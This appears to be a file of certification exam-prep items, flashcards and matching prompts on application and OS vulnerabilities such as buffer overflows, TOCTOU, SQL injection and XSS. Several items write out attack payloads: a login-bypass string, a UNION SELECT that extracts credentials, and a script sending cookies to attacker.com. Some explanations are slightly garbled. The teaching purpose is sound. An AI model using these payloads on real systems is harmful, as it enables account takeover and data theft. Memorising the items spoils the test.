sb_fix_2.note: Buffer overflow term in glossary (p.176). The specific C functions (strcpy/gets/sprintf) are programmer-level and were NOT found by name in the Tier 2 corpus; item stands on the strong Tier 1 buffer-overflow backing.

questions.q: A buffer overflow attack works by:
opts: Flooding a server with very high-volume network traffic until it crashes
Decrypting protected data using brute-force cryptographic key search
Injecting SQL commands into a web form to manipulate the underlying database
Writing more data than a buffer can hold, overwriting adjacent memory to potentially redirect execution
questions.exp: Buffer overflows occur when input exceeds buffer capacity — overwriting memory that can redirect program execution.

questions.q: A stack canary is used to:
opts: Marking stack memory as non-executable to prevent shellcode
Randomize all process memory addresses at load time to prevent injection
Monitor network traffic for buffer overflow attack signature patterns
Detect buffer overflow attempts by placing a random value before the return address
questions.exp: Stack canaries are random values placed before the return address — if they change, an overflow is detected and the program halts.

questions.q: Buffer overflows are most commonly found in programs written in:
opts: Python or Java which use managed memory and bounds checking
C or C++ which allow direct memory access without bounds checking
HTML or JavaScript which run in interpreted runtime sandboxes
SQL or other database query languages without compiled code
questions.exp: C and C++ allow direct memory manipulation without automatic bounds checking — making buffer overflows possible.

questions.q: Which combination of mitigations BEST protects against buffer overflow exploitation?
opts: Network firewall rules and intrusion detection
VPN tunneling and end-to-end encryption
Multi-factor authentication and strong passwords
ASLR, DEP, stack canaries, and input validation
questions.exp: ASLR (randomizes addresses), DEP (blocks code in data memory), canaries (detect overflow), input validation (prevents overlong input).

scenarios.q: A QA tester sends a packet with a length field claiming 4096 bytes but only containing 64 bytes. The application crashes — it allocated a 64-byte buffer but attempted to read 4096 bytes into it based on the length field. What vulnerability does this demonstrate?
opts: An integer overflow in the length-field parser causing wrap-around at boundary values
A SQL injection in the packet-processing logic exposed by the unsanitized length value
A race condition between packet receipt and buffer allocation timing in the I/O loop
A buffer overflow caused by trusting unsanitized input for memory allocation size — reading beyond the allocated buffer
scenarios.exp: Buffer overflow: the application trusted the attacker-controlled length field without validation. The fix is to validate that the declared length matches actual received data before using it. Never trust user-controlled values for memory operations without bounds checking.

scenarios.q: A legacy C++ codebase uses sprintf() extensively to format strings into fixed-size character arrays. A junior developer asks why this is flagged as high-risk. What is the BEST explanation?
opts: sprintf() doesn't check whether the formatted output exceeds the destination buffer size — an attacker controlling format inputs could overflow the buffer and overwrite adjacent memory
sprintf() is deprecated and produces measurably slower runtime code than newer printf-family alternatives in modern C/C++ compilers
sprintf() is vulnerable to SQL injection when its output is concatenated into untrusted database query strings constructed at runtime
sprintf() doesn't support Unicode strings or modern character encodings, so multi-byte data may corrupt the output buffer in unpredictable ways
scenarios.exp: sprintf() writes to a destination buffer without checking its size. If the formatted output is larger than the buffer, it overwrites adjacent memory — a classic buffer overflow. Modern alternatives like snprintf() require an explicit size limit.

scenarios.q: A buffer overflow vulnerability exists in a Windows service. An attacker's exploit works in a test environment but fails against production. Investigation reveals production has ASLR enabled. Why does ASLR make exploitation unreliable?
opts: ASLR randomizes memory addresses only at install time, so a determined attacker can derive the layout offline
ASLR randomizes the memory addresses of the stack, heap, and libraries at each execution — the attacker can't hardcode a reliable return address
ASLR detects buffer overflow attempts and terminates the offending process before exploitation completes
ASLR prevents writes to the stack memory region by enforcing data execution prevention at runtime
scenarios.exp: ASLR randomizes where code and data are loaded in memory each run. A buffer overflow exploit needs to overwrite the return address with a specific value pointing to shellcode or a useful gadget. ASLR means that address changes every run — making reliable exploitation much harder without chaining an information leak vulnerability.

cram.def: Security flaw where outcome depends on the timing/sequence of events — attacker manipulates timing to gain advantage.
Attacker modifies a resource AFTER it is checked but BEFORE it is used. Classic race condition.
Programming construct ensuring only one thread accesses a shared resource at a time.
Operation that cannot be interrupted partway through — eliminates race condition window.

matching.prompt: Outcome depends on timing of events
Modify resource between check and use
Ensures only one thread accesses resource at a time
Operation that cannot be interrupted

questions.q: A race condition vulnerability occurs when:
opts: Two users log in simultaneously and the application accidentally cross-contaminates their session data
The security of an operation depends on the timing or sequence of events, which an attacker can manipulate
A server is overwhelmed with simultaneous requests and starts dropping connections under high load
Encryption is applied incorrectly because the same nonce is reused across multiple message sessions
questions.exp: Race conditions arise when the outcome depends on timing — an attacker manipulates the sequence to gain an unintended result.

questions.q: TOCTOU stands for:
opts: Time of Control, Time of Use
Technique of Compromise Through Open Utilities
Time-of-Check to Time-of-Use
Threat of Credential Theft over Untrusted Origination
questions.exp: TOCTOU = Time-of-Check to Time-of-Use. The attacker modifies a resource after it's checked as safe but before it's used.

questions.q: A developer checks if a file is owned by the correct user, then opens it. An attacker replaces the file between these steps. This is:
opts: A TOCTOU race condition
A SQL injection attack
A buffer overflow attack
A DLL injection attack
questions.exp: This is a classic TOCTOU attack — the file passes the check but is replaced before use.

scenarios.q: A banking application checks a user's account balance before processing a transfer. Between the balance check and the debit operation, an attacker rapidly initiates multiple transfer requests simultaneously. Each request sees the balance as sufficient, and the bank processes all — resulting in the user spending more than their actual balance. What vulnerability class is this?
opts: SQL injection in the transfer-processing logic that lets the attacker manipulate the balance check
An integer overflow in the transaction amount that wraps around at the maximum signed value
A buffer overflow in the balance comparison function that lets the attacker overwrite the result
A TOCTOU race condition — the balance is checked but can change between the check and the debit operation
scenarios.exp: TOCTOU race condition: the check (balance verification) and the use (debit operation) are not atomic. Multiple concurrent requests each pass the check independently. The fix is an atomic database transaction that locks the account record between check and update.

scenarios.q: Code creates a temporary file, checks if it's safe to process, then opens it for processing. A security reviewer flags this as a TOCTOU vulnerability. What specific attack would exploit this, and what is the fix?
opts: SQL injection in the file-name parameter — fix: use parameterized queries throughout the file-handling code path to neutralize the input strings
A buffer overflow if the file is too large — fix: limit the maximum file size at upload time and reject anything over the configured threshold

An attacker replaces the file with a symlink to a sensitive system file between the safety check and the open() call — fix: use the file descriptor from the initial check rather than re-opening by name
A race condition in the file-system driver layer — fix: upgrade the OS kernel to a version with stricter atomic file operations and consistent locking
scenarios.exp: Classic TOCTOU: between check (is this file safe?) and use (open the file), an attacker swaps the file with a symlink to /etc/passwd or another sensitive file. Fix: open the file first to get a file descriptor, then check the safety of the descriptor's content — not the filename, which can be changed underneath you.

cram.def: Legitimate-looking software update that delivers malware. Exploits user/system trust in update processes.
Classic supply chain attack — malicious update to Orion platform affected 18,000 organizations including US government.
Code signing of updates, verify update integrity (hash check), use official update channels only.

matching.prompt: Update that delivers malware via trusted mechanism
Major 2020 supply chain attack via software update
Best mitigation for malicious updates
matching.answer: Code signing and official update channels

questions.q: Which BEST explains why a malicious update attack is so dangerous?
opts: It exploits user and system trust in legitimate update mechanisms — signed binaries from a trusted vendor pass normal security controls without raising alarms
Updates always require kernel-level privileges to install, so any malicious update automatically runs as ring 0 regardless of the actual installer
Update channels use unencrypted HTTP transport, so an on-path attacker can swap the payload during transit to the consumer
Operating systems automatically install every offered update without any user consent or admin approval, regardless of source
questions.exp: Malicious update attacks weaponize the trust chain that consumers extend to their software vendors. The malware arrives as a signed update from a vendor the user already trusts; allowlisting, EDR, and signature-verification rules typically pass it because the signature is valid and the source is approved. This is the SolarWinds-class pattern. The other distractors are factually wrong (kernel privileges aren't always required; modern updates use HTTPS) or misstate update behavior (most OS updates require user/admin consent). Trust exploitation is the defining axis.

questions.q: The SolarWinds attack is an example of:
opts: A supply chain attack via a compromised software update
A targeted spear-phishing campaign against admins
A watering hole attack via compromised website
A buffer overflow exploit in the network stack
questions.exp: SolarWinds delivered malware through a legitimate software update — a textbook supply chain attack affecting thousands of organizations.

questions.q: Which control BEST protects against malicious software updates?
opts: Disabling all automatic updates and requiring manual installation by IT for every update
Using a VPN for update downloads to ensure they cannot be intercepted in transit
Installing all updates immediately without testing to minimize the patch-to-deploy gap
Verifying digital signatures on updates and using only official update channels
questions.exp: Code signing verification ensures updates genuinely came from the vendor and haven't been tampered with.

scenarios.q: A software company's build server is compromised. The attacker doesn't modify source code but alters the build pipeline to add a small module to every compiled binary before signing. Customers receive the software, which passes code signature verification. Two months later the module begins exfiltrating data. What attack is this, and why did code signing not prevent it?
opts: A supply chain attack on the build pipeline — the malicious code was added before signing, so the signed binary is authentic but compromised
A watering hole attack — code signing can't detect injection on web pages users visit during work hours
A DLL injection attack — the injected DLL was signed separately and then chained at install time
A zero-day exploit in the compiler itself that injects malicious instructions during compilation
scenarios.exp: Supply chain attack on the build pipeline (similar to SolarWinds). Code signing verifies the binary matches what was signed — it doesn't verify the build process was clean. The attacker modified the build process before signing, so the signed output was legitimately signed malicious code.

scenarios.q: An organization automatically pushes software updates to 50,000 endpoints within hours of vendor release. A security manager proposes a 72-hour staging period. A security engineer argues speed is critical for zero-days. What is the BEST compromise?
opts: The security manager — all updates should wait 72 hours regardless
The security engineer — all updates should deploy immediately to minimize exposure
Both have valid points — risk-tiered deployment: critical security patches (CVSS 9+) deploy within hours; standard patches go through staging first
The security manager — staging should extend to 30 days for proper testing
scenarios.exp: Risk-tiered deployment: staging catches problematic updates (and malicious ones like SolarWinds). But for critical zero-days, 72 hours of exposure is worse than a small risk of a bad patch. Tier by severity — critical security patches fast, everything else staged.

cram.def: Exploiting a vulnerability to gain higher privileges than authorized. Vertical: user to admin. Horizontal: user to user.
Vendor no longer provides security patches. Running EOL OS is a significant risk.
SMBv1 (EternalBlue/WannaCry), NTLM — should be disabled.
Regular patching, disable unnecessary services/protocols, least privilege, host-based firewalls, EDR.

matching.prompt: Gaining higher privileges than authorized
OS no longer receiving security patches
Protocol exploited by WannaCry ransomware
Most common mitigation for OS vulnerabilities

questions.q: Privilege escalation means:
opts: Creating additional standard user accounts to log in across multiple systems for testing
Logging in to multiple systems simultaneously using the same standard user credentials
An attacker gaining higher privileges than they were originally granted
Encrypting critical operating system files to deny access until payment is received
questions.exp: Privilege escalation exploits vulnerabilities to gain admin/root access — enabling full system control.

questions.q: Which BEST captures why running an end-of-life operating system creates significant security risk?
opts: EOL operating systems are blocked from accessing the internet by ISPs to protect other users from compromised hosts on the open network
EOL operating systems are inherently slower and consume more memory than supported versions because vendor performance patches stop after EOL
EOL operating systems cannot run modern security tools because all major AV/EDR vendors immediately drop EOL OS support on the EOL date itself
The vendor no longer issues security patches, so newly disclosed vulnerabilities in the OS become permanently exploitable — defenders have no upstream fix path
questions.exp: The defining EOL risk is the loss of patches. When new CVEs are disclosed against a supported OS, the vendor releases a patch and defenders apply it. After EOL, no patches arrive — every newly disclosed vulnerability becomes a permanent exposure with no upstream remediation path. The distractors confuse OS support with: performance (B — wrong; performance is not the security risk), AV/EDR availability (C — partially true over very long timescales but not the defining EOL day-zero issue), and ISP-level blocking (D — fabricated). Compensating controls (segmentation, monitoring) reduce exposure but do not close the underlying gap.

questions.q: The WannaCry ransomware exploited which legacy Windows protocol vulnerability?
opts: SMBv1 (EternalBlue vulnerability)
NTLM (legacy Windows authentication)
RDP (Remote Desktop Protocol)
NetBIOS (legacy Windows networking)
questions.exp: WannaCry used the EternalBlue exploit targeting SMBv1 — spreading automatically across unpatched Windows systems.

questions.q: Which is the MOST effective mitigation for operating system vulnerabilities?
opts: Routinely using a corporate VPN connection
Changing all default administrator passwords
Regular and timely application of security patches
Enabling full disk encryption on all endpoints
questions.exp: Patching is the primary mitigation — it removes the vulnerabilities attackers exploit.

scenarios.q: An attacker gains access to a Windows workstation as a standard user. They discover an unpatched local privilege escalation vulnerability in a third-party application. After exploitation, they have SYSTEM-level access. The workstation had antivirus installed and the OS was fully patched. What does this scenario demonstrate?
opts: Vertical privilege escalation via an unpatched third-party application — OS patching alone is insufficient; all installed software must be included in patch management
That antivirus is ineffective against all attacks targeting third-party applications, regardless of patching state
That standard user accounts provide no security benefit, since any unpatched application can be used to escalate
That the antivirus vendor should have blocked the third-party application's exploit through behavioral signatures alone
scenarios.exp: Vertical privilege escalation (user to SYSTEM) via a third-party app vulnerability. Patch management must include ALL software, not just the OS. Many organizations focus on Windows Update but neglect third-party applications which are increasingly targeted precisely because they're often behind on patches.

scenarios.q: A hospital runs a critical patient monitoring system on Windows XP because the medical device vendor won't support newer OS versions and a new version won't be available for 18 months. What is the MOST appropriate interim risk management approach?
opts: Continue operating as-is — the device has been running fine for years

Implement compensating controls: network segmentation isolating the device, strict firewall rules limiting its communication, enhanced monitoring — while working with the vendor on an accelerated upgrade timeline
Immediately shut down the patient monitoring system until a supported OS version is available
Upgrade the OS to Windows 10 without vendor approval since patient safety requires it
scenarios.exp: EOL OS on a medical device: a classic OT dilemma. Patient safety requires the device to keep running. Compensating controls — isolation limits blast radius, strict firewall rules limit attack vectors, monitoring detects anomalies — reduce risk while replacement is planned. Document the accepted risk formally.

scenarios.q: A penetration tester with low-privilege domain user access uses a tool to request Kerberos service tickets for service accounts with weak passwords, then takes the encrypted tickets offline for cracking. What technique is this, and what does it enable?
opts: Pass-the-hash — enables lateral movement using captured NTLM hashes
Kerberoasting — enables offline cracking of service account password hashes, potentially leading to privilege escalation if service accounts have admin rights
Golden ticket attack — requires domain admin credentials first
AS-REP roasting — exploits accounts with pre-authentication disabled
scenarios.exp: Kerberoasting: any domain user can request service tickets; the ticket is encrypted with the service account's password hash. Taking it offline allows password cracking without further network interaction. If the service account has admin privileges (common misconfiguration), cracking the password leads to privilege escalation.

cram.def: Inserting malicious SQL code into user input fields to manipulate backend database queries.
Input: ' OR '1'='1 — always true, bypasses login without valid credentials.
Database doesn't return data directly — attacker infers information from true/false responses or timing.
Malicious SQL stored in the database and executed when retrieved — e.g. in a profile field.
The PRIMARY mitigation. Separates SQL code from user data — input can never become executable SQL.

matching.prompt: Inserting malicious SQL into input fields
Primary mitigation for SQL injection
SQLi that never returns data directly
Always-true input that bypasses login
Web application layer defense against SQLi

questions.q: SQL injection attacks target:
opts: Network bandwidth and overall availability of services
Physical security control systems and access badges
Wireless network encryption protocols and pre-shared keys
Web application databases by inserting malicious SQL code into input fields
questions.exp: SQLi inserts malicious SQL into input fields — manipulating database queries to exfiltrate, modify, or delete data.

questions.q: What is the PRIMARY mitigation against SQL injection?
opts: Parameterized queries (prepared statements)
Strict input length limits enforced at the form
A web application firewall as the only control
HTTPS encryption for all client-server traffic
questions.exp: Parameterized queries separate SQL code from user data — input can never be interpreted as executable SQL code.

questions.q: An attacker enters ' OR '1'='1 into a login form. If successful, this is:
opts: SQL injection for authentication bypass
A stack-based buffer overflow exploit
A cross-site scripting (XSS) attack
A directory traversal exploitation attempt
questions.exp: This classic SQLi payload creates an always-true condition, bypassing authentication without valid credentials.

questions.q: Which BEST distinguishes blind SQL injection from in-band SQL injection?
opts: Blind SQLi targets stored procedures specifically while in-band targets only inline SQL queries embedded in the application code
In blind SQLi the database does not return query results in the response; the attacker infers data one bit at a time from side effects (boolean responses, timing, error presence)
Blind SQLi requires authenticated access to the application while in-band runs unauthenticated against any reachable endpoint
Blind SQLi works only against MySQL while in-band SQL injection works against any relational database management system
questions.exp: In-band SQLi returns query results directly in the application's response, often via UNION SELECT or visible error messages. Blind SQLi has no direct data return — the attacker extracts data bit-by-bit by observing side effects: a true/false boolean condition that changes the page output, a timing difference (sleep-based), or the presence/absence of an error. Blind SQLi is slower but works against modern apps that suppress raw query output. Stored procedures, authentication state, and database vendor are not the defining axis.

scenarios.q: A web application's search passes user input directly to SQL: SELECT * FROM products WHERE name = '[input]'. An attacker enters: ' UNION SELECT username, password, null FROM users-- and receives usernames and password hashes in the search results. What is the root cause?
opts: Cross-site scripting — the search field reflected attacker input into the response page without HTML encoding
CSRF — the attacker forged a search request on behalf of a legitimate authenticated user without their knowledge or consent
A stored XSS attack that persisted in the database and ran whenever any user later viewed the search results
Union-based SQL injection — the root cause is concatenating unsanitized user input directly into a SQL query rather than using parameterized queries
scenarios.exp: Union-based SQLi: the attacker extended the original query with UNION SELECT to retrieve data from another table. Root cause: string concatenation of user input into SQL. Parameterized queries treat user input as data, never as executable SQL.

scenarios.q: A developer fixes a SQL injection vulnerability by blocking single quotes, semicolons, and the word 'SELECT'. A security reviewer rejects this fix. Why?
opts: The developer used the wrong list of blocked characters — additional characters like parentheses, equals signs, and dashes should also be in the deny-list
Single quotes are legitimate in names like O'Brien and many real surnames — the filter would reject all valid users with apostrophes in their data
The developer should have used a WAF instead of code changes — application-layer fixes belong at the network perimeter, not in the source code

Blocklist-based input filtering is inherently incomplete — attackers can use encoding (hex, Unicode), case variations (SeLeCt), or alternative SQL syntax to bypass it. Parameterized queries are the correct fix
scenarios.exp: Blocklist filtering is fundamentally flawed — too many ways to encode malicious input. Parameterized queries completely separate code from data — user input is never parsed as SQL regardless of what it contains. WAF is a useful additional layer but not a replacement for fixing the root cause.

scenarios.q: A security team finds a blind SQL injection vulnerability in a product search parameter. No data is returned in error messages — the page either shows products or shows 'no results.' How does an attacker exploit blind SQLi, and what is the risk?
opts: The attacker asks true/false questions using Boolean conditions and infers database structure from whether results appear — eventually extracting the entire database through many requests
Blind SQLi cannot be exploited because no data is returned in the response — the attacker has no channel at all to extract anything
The attacker can only cause denial of service, not data exfiltration, because every probe requires a separate full request roundtrip
Blind SQLi requires physical access to the database server to read the query log and reconstruct attacker intent from request timing
scenarios.exp: Blind SQLi exploitation: no direct output, but the attacker observes page behavior differences. By asking binary questions ('is the first character of the admin password greater than M?'), they eventually extract everything — slowly but completely. Automated tools make this practical.

cram.def: Injecting malicious client-side scripts (usually JavaScript) into web pages viewed by other users.
Malicious script is in the URL/request and reflected back in the response. Requires victim to click a crafted link.
Malicious script stored in the database and served to all users who view that content.
Vulnerability exists in client-side JavaScript code — never sent to server. Manipulates the DOM.
SQLi targets the server/database. XSS targets the CLIENT — executes in victim's browser.
HTTP header that restricts which scripts can execute — blocks inline scripts and unauthorized sources.

matching.prompt: Script in URL reflected back to victim
Script stored in DB served to all users
Client-side JS vulnerability, never hits server
HTTP header restricting script sources
Cookie attribute preventing script access
XSS targets

questions.q: Cross-site scripting (XSS) attacks inject malicious scripts into:
opts: Network packets at the data link or network transport layer
Trusted web pages viewed by other users — executing in their browsers
Database query strings sent from the application to the server
DNS query responses returned by upstream recursive resolvers
questions.exp: XSS injects client-side scripts into web pages — the malicious script executes in the victim's browser.

questions.q: The PRIMARY difference between XSS and SQL injection is:
opts: XSS targets the client/browser; SQLi targets the server/database
XSS uses JavaScript; SQLi uses Python
XSS is more dangerous than SQLi
SQLi is obsolete; XSS is current
questions.exp: XSS executes in the victim's browser (client-side). SQLi manipulates the server's database (server-side).

questions.q: The HttpOnly cookie attribute mitigates XSS by:
opts: Encrypting all cookie contents using AES
Making cookies expire immediately on close
Blocking all cookies at the browser level
Preventing JavaScript from accessing the cookie
questions.exp: Stops XSS scripts from stealing session cookies. HttpOnly prevents client-side scripts from reading cookies — even if XSS is successful, session cookies can't be stolen by the script.

questions.q: An attacker posts a comment on a website containing malicious JavaScript. Every user who views the comment executes the script. This is:
opts: Reflected XSS (non-persistent type)
DOM-based XSS (client-side type)
CSRF (cross-site request forgery) attack
Stored (persistent) XSS
questions.exp: The script is stored in the database and served to every subsequent visitor — stored/persistent XSS.

scenarios.q: A news website's comment section reflects user input directly into the page HTML without encoding. A researcher posts: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>. Any user who views the comments page sends their session cookie to the attacker. What type of XSS is this, and why is it more dangerous than reflected XSS?
opts: Reflected XSS — it requires a specially crafted link
DOM-based XSS — it manipulates the page DOM without server involvement
CSRF — it forges requests on behalf of authenticated users
Stored (persistent) XSS — the payload is saved in the database and executes for every user who views the page, not just those who click a crafted link
scenarios.exp: Stored XSS: the malicious script is stored in the database (as a comment) and served to every visitor. No crafted link is required — simply viewing the comments page triggers the attack. More dangerous than reflected XSS because it scales to all users automatically and persists until removed.

scenarios.q: A developer encodes < as < and > as > to fix an XSS vulnerability in a review field. A security tester bypasses this by injecting: " onmouseover="alert(document.cookie)" into an HTML attribute (the product image alt text). What does this demonstrate?
opts: Output encoding doesn't reliably work against XSS at all — the only effective remediation is removing all user-supplied content from the response
The developer should have used a blocklist of dangerous characters including < > " ' / and the literal word 'script' in any case combination

Context-specific encoding is required — HTML attribute context requires different encoding than HTML body context. Encoding < and > is insufficient inside attribute values where " can break out of the attribute
The image alt text attribute is immune to XSS in all browser contexts because browsers do not interpret HTML markup inside any attribute values
scenarios.exp: Context-sensitive encoding: XSS exists in multiple injection contexts, each requiring different encoding rules. Encoding < and > protects HTML body but not attribute contexts where " breaks out of the attribute value. A proper output encoding library handles context-appropriate encoding automatically.

scenarios.q: A company's Content Security Policy is: default-src 'self'; script-src 'self' 'unsafe-inline'. A security auditor flags 'unsafe-inline' as defeating the purpose of CSP for XSS mitigation. Why?
opts: 'unsafe-inline' allows scripts from self, which creates SSRF risks
'unsafe-inline' permits inline script execution
'unsafe-inline' only applies to CSS, not JavaScript
'unsafe-inline' is required for modern web applications and the auditor is incorrect
scenarios.exp: Which is exactly what XSS uses. CSP's primary XSS mitigation is blocking inline scripts; adding 'unsafe-inline' negates this entirely. 'unsafe-inline' defeats CSP's core XSS protection. CSP prevents XSS by blocking inline scripts and requiring all scripts to load from approved sources. 'unsafe-inline' overrides this — permitting exactly what XSS uses. The fix is to remove it and use nonces or hashes to whitelist specific legitimate inline scripts.

cram.def: Flaw in device firmware (low-level software). Hard to patch, may persist through OS reinstalls.
Manufacturer no longer provides firmware/driver updates — permanent unpatched vulnerabilities.
Extracting information from physical signals (power consumption, EM emissions, timing).
CPU speculative execution vulnerabilities allowing reading of protected memory. Hardware-level flaw.

Hardware no longer receiving updates
Attack using power consumption or EM signals
CPU vulnerability exploiting speculative execution
